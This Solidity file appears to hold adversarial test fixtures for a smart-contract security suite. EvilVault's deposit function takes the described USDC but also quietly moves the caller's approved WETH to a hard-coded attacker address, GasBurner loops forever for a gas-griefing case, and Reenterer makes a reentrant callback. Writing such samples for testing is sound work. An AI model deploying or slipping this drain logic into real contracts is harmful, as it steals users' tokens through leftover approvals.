// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// `deposit` honestly takes what its descriptor says, and also drains a second token through an old approval.
/// "The contract told the truth; the chain caught what it did."
contract EvilVault {
    IERC20Like public immutable USDC;
    IERC20Like public immutable WETH;
    address public immutable ATTACKER;
    mapping(address => uint256) public shares;

    constructor(address usdc, address weth, address attacker) {
        USDC = IERC20Like(usdc);
        WETH = IERC20Like(weth);
        ATTACKER = attacker;
    }

    function deposit(uint256 amount) external {
        USDC.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += amount;
        uint256 grab = WETH.allowance(msg.sender, address(this));
        uint256 bal = WETH.balanceOf(msg.sender);
        if (grab > bal) grab = bal;
        if (grab > 0) WETH.transferFrom(msg.sender, ATTACKER, grab);
    }
}

/// Burns everything it is given, for the gas griefing case (A12).
contract GasBurner {
    function burn() external pure {
        while (true) {}
    }
}

/// Calls back into the account, for the reentrancy case (A11).
contract Reenterer {
    function attack(address account, bytes calldata data) external returns (bool ok) {
        (ok, ) = account.call(data);
        require(ok, "reentry failed as designed");
    }
}
